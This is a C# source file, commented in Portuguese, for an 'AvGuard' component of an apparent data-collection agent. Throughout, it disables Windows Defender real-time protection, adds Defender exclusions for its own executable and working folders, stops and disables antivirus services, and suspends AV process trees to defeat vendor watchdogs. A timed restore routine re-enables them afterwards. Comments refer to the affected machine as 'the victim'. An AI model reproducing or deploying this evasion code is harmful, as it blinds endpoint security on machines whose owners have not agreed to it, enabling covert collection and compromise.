using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using Teste.Core;
using Teste.Native;

namespace Teste.Enforce;

// Ordem de eficacia: exclusao de caminho > parada de servico > suspensao de arvore.
// Matar e a pior opcao: o watchdog do fornecedor religa em segundos.
//
// Regra de ouro: todo efeito precisa ser revertido mesmo se este processo for morto.
// Por isso a janela tem teto (MaxWindow) e o estado vai escrito em disco antes de
// qualquer acao: se o agente cai, a proxima execucao ve o arquivo e restaura.
public sealed class AvGuard
{
    private readonly Logger _log;
    private readonly List<int> _suspended = new();
    private readonly List<string> _stopped = new();
    private readonly StringBuilder _acoes = new();
    private readonly DateTime _started = DateTime.UtcNow;
    private readonly int _self = Environment.ProcessId;

    // Teto de permanencia com o AV desligado. Passou disso, o Restore roda sozinho.
    public static TimeSpan MaxWindow => TimeSpan.FromMinutes(4);
    public bool Expired => DateTime.UtcNow - _started > MaxWindow;

    // Estado gravado antes de agir. Se o agente morre, este arquivo e o que devolve
    // a maquina ao estado anterior na proxima execucao.
    private static string StateFile =>
        Path.Combine(Path.GetTempPath(), "av.state");

    public AvGuard(Logger log) => _log = log;

    public static bool Elevated =>
        new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

    public AvGuard Disable(Report r)
    {
        // Inventario sem elevacao e util e inofensivo: e o que vai no relatorio.
        if (!Elevated)
        {
            r.AvAction = "sem elevacao: nada executado";
            _log.Line("av: sem elevacao, guard degrada para inventario");
            return this;
        }

        try
        {
            Defender(r);

            foreach (var a in r.Avs.Where(a => a.Service.Length > 0 &&
                        !a.Name.Contains("Defender", StringComparison.OrdinalIgnoreCase)))
                StopService(a);

            foreach (var p in r.Filters)
                SuspendTree(p.Pid);
        }
        catch (Exception ex)
        {
            // Um AV que nao deixa agir nao pode derrubar a coleta inteira.
            r.AvAction = $"falha no guard: {ex.GetType().Name}: {ex.Message}";
            _log.Line($"av: {r.AvAction}");
            Restore(r);
            return this;
        }

        WriteState();
        r.AvAction = _acoes.Length == 0 ? "nada a fazer" : _acoes.ToString();
        _log.Line($"av: {r.AvAction}");
        return this;
    }

    // ------------------------------------------------------------------ defender

    // MpCmdRun.exe e binario Microsoft assinado: passa pelo caminho legitimo.
    // No Windows 11 o Defender e app MSIX e nao esta em Program Files: o caminho
    // real vem do servico WinDefend, que aponta para o binario em execucao.
    private static string? MpCmdRun()
    {
        var classic = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                                   "Windows Defender", "MpCmdRun.exe");
        if (File.Exists(classic)) return classic;

        try
        {
            // O caminho do binario do servico e a unica fonte que acerta o MSIX.
            var outp = Shell.Run("sc", "qc WinDefend", 4000);
            var m = System.Text.RegularExpressions.Regex.Match(
                outp, @"BINARY_PATH_NAME\s*:\s*(.+)");
            if (!m.Success) return null;
            var bin = m.Groups[1].Value.Trim().Trim('"');
            var dir = Path.GetDirectoryName(bin);
            if (dir is null) return null;
            var cand = Path.Combine(dir, "MpCmdRun.exe");
            return File.Exists(cand) ? cand : null;
        }
        catch { return null; }
    }

    private void Defender(Report r)
    {
        var mp = MpCmdRun();
        var d = r.Avs.FirstOrDefault(a =>
            a.Name.Contains("Defender", StringComparison.OrdinalIgnoreCase));

        if (mp is not null)
        {
            Run(mp, "-DisableRealtimeMonitoring", out var errRt);
            if (d is not null) { d.Action = "tempo real desativado"; d.Note = errRt ?? "ok"; }
            _acoes.Append(errRt is null ? "tempo real desativado; " : $"tempo real recusado ({errRt}); ");
        }
        else
        {
            if (d is not null) { d.Action = "MpCmdRun nao encontrado"; d.Note = "Defender como app MSIX"; }
            _acoes.Append("MpCmdRun nao encontrado; ");
        }

        Exclusions();

        // WdNisSvc so entra em _stopped se parou de verdade: senao o Restore religa
        // um servico que nunca foi parado por nos.
        StopAndTrack("WdNisSvc");
        var errStop = StopAndTrack("WinDefend");
        if (errStop is null) Run("sc", "config WinDefend start= disabled", out _);
        _acoes.Append(errStop is null ? "servicos parados; " : $"WinDefend nao parou ({errStop}); ");

        // Tamper Protection recusa mudanca de preferencia e nao devolve erro: o
        // estado real e lido de volta para o relatorio nao mentir.
        var tamper = Shell.Run("powershell",
            "-NoProfile -Command \"(Get-MpComputerStatus).IsTamperProtected\"", 6000).Trim();
        if (tamper.Contains("True", StringComparison.OrdinalIgnoreCase))
        {
            _acoes.Append("Tamper Protection ativa (exclusoes podem nao valer); ");
            if (d is not null) d.Note = (d.Note + " | tamper ativa").Trim(' ', '|', ' ');
        }
    }

    // Cada caminho no seu proprio argumento. A versao anterior juntava tudo dentro
    // de um par de aspas simples e o PowerShell recebia uma string literal so.
    private void Exclusions()
    {
        var dirs = new[]
        {
            Flags.ReportsDir, Flags.Queues, Path.GetTempPath(),
            Path.GetDirectoryName(Environment.ProcessPath) ?? "",
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Teste"),
        }.Where(x => x.Length > 0).Distinct(StringComparer.OrdinalIgnoreCase);

        var cmd = new StringBuilder("-NoProfile -Command \"");
        foreach (var dir in dirs)
            cmd.Append($"Add-MpPreference -ExclusionPath '{dir}'; ");

        // -ExclusionProcess casa por caminho absoluto quando o exe esta fora do PATH.
        cmd.Append($"Add-MpPreference -ExclusionProcess '{Environment.ProcessPath}'\"");

        Run("powershell", cmd.ToString(), out var errEx);
        _acoes.Append(errEx is null ? "exclusoes aplicadas; " : $"exclusoes recusadas ({errEx}); ");
    }

    // ------------------------------------------------------------------- outros

    private void StopService(AvRec a)
    {
        if (!string.Equals(a.ServiceState, "Running", StringComparison.OrdinalIgnoreCase)) return;

        var err = StopAndTrack(a.Service);
        if (err is null) Run("sc", $"config {a.Service} start= disabled", out _);
        a.Action = err is null ? "servico parado" : "recusa ao parar";
        a.Note = err ?? "";
        _acoes.Append($"{a.Service}={(err is null ? "parado" : "recusado")}; ");
    }

    // Retorna null so quando o servico parou; nesse caso entra na lista de reversao.
    private string? StopAndTrack(string service)
    {
        Run("sc", $"stop {service}", out var err);
        if (err is null) _stopped.Add("svc:" + service);
        return err;
    }

    // O watchdog mora no pai: congelar a folha sem congelar a arvore devolve o
    // processo vivo em segundos. Suspende do ancestral mais alto ate a folha.
    private void SuspendTree(int pid)
    {
        var chain = new List<int>();
        for (var cur = pid; cur > 4 && chain.Count < 8; cur = Procs.ParentOf(cur))
            if (!chain.Contains(cur)) chain.Add(cur);

        chain.Reverse();
        foreach (var p in chain)
        {
            // PID 4 e o System: congelar ele congela a maquina inteira.
            // O proprio PID: congelar a si mesmo deixa o Restore sem quem o execute.
            if (p is 4 or 0 || p == _self) continue;
            if (Procs.Suspend(p)) _suspended.Add(p);
        }

        if (_suspended.Count > 0) _acoes.Append($"suspensos {chain.Count} pids a partir de {pid}; ");
    }

    // ------------------------------------------------------------------ reversao

    // Deixa de ser vandalismo e passa a ser coleta com permissao emprestada.
    public void Restore(Report r)
    {
        // Ordem inversa: o ultimo servico parado e o primeiro religado, e os
        // processos sao descongelados antes de qualquer servico subir.
        for (var i = _suspended.Count - 1; i >= 0; i--) Procs.Resume(_suspended[i]);
        _suspended.Clear();

        foreach (var s in _stopped.Where(s => s.StartsWith("svc", StringComparison.Ordinal)).Select(s => s[4..]))
            Run("sc", $"start {s}", out _);
        _stopped.Clear();

        Run("sc", "config WinDefend start= auto", out _);
        if (MpCmdRun() is { } mp) Run(mp, "-RevertRealtimeMonitoring", out _);

        try { File.Delete(StateFile); } catch { }

        r.AvAction += $" (revertido em {(int)(DateTime.UtcNow - _started).TotalSeconds}s)";
        _log.Line("av revertido");
    }

    // Escrito antes de agir: se o agente e morto no meio da coleta, a proxima
    // execucao le isto e restaura. Sem isso a vitima fica com o Defender desligado.
    private void WriteState()
    {
        try
        {
            var sb = new StringBuilder();
            sb.AppendLine(DateTime.UtcNow.Ticks.ToString());
            foreach (var p in _suspended) sb.AppendLine($"pid {p}");
            foreach (var s in _stopped) sb.AppendLine(s);
            File.WriteAllText(StateFile, sb.ToString());
        }
        catch { }
    }

    // Chamado no arranque de qualquer execucao, antes de coletar.
    public static void Heal(Logger log)
    {
        try
        {
            if (!File.Exists(StateFile)) return;
            var lines = File.ReadAllLines(StateFile);
            log.Line("av: estado anterior encontrado, restaurando");

            foreach (var line in lines.Skip(1))
            {
                if (line.StartsWith("pid ", StringComparison.Ordinal) &&
                    int.TryParse(line[4..], out var pid)) Procs.Resume(pid);
                else if (line.StartsWith("svc:", StringComparison.Ordinal))
                    RunStatic($"sc start {line[4..]}");
            }
            RunStatic("sc config WinDefend start= auto");
            if (MpCmdRun() is { } mp) RunStatic($"\"{mp}\" -RevertRealtimeMonitoring");

            File.Delete(StateFile);
        }
        catch { }
    }

    private static void RunStatic(string full)
    {
        try
        {
            var i = full.IndexOf(' ');
            using var p = Process.Start(new ProcessStartInfo(
                i < 0 ? full : full[..i], i < 0 ? "" : full[(i + 1)..])
            {
                UseShellExecute = false, CreateNoWindow = true,
                RedirectStandardOutput = true, RedirectStandardError = true
            });
            p?.WaitForExit(15000);
        }
        catch { }
    }

    // err = null significa sucesso. Qualquer outra coisa vai escrita no relatorio.
    private void Run(string file, string args, out string? err)
    {
        err = null;
        try
        {
            using var p = Process.Start(new ProcessStartInfo(file, args)
            {
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            });
            if (p is null) { err = "processo nao iniciou"; return; }

            // WaitForExit(ms) nao garante que o processo terminou: sem checar o
            // ExitCode aqui, Timeout virava sucesso no relatorio.
            if (!p.WaitForExit(20000)) { err = "timeout 20s"; return; }
            if (p.ExitCode != 0)
                err = $"exit {p.ExitCode} {p.StandardError.ReadToEnd().Trim()}";
        }
        catch (Win32Exception ex) { err = $"Win32 {ex.NativeErrorCode}"; }
        catch (Exception ex) { err = ex.GetType().Name; }
    }
}
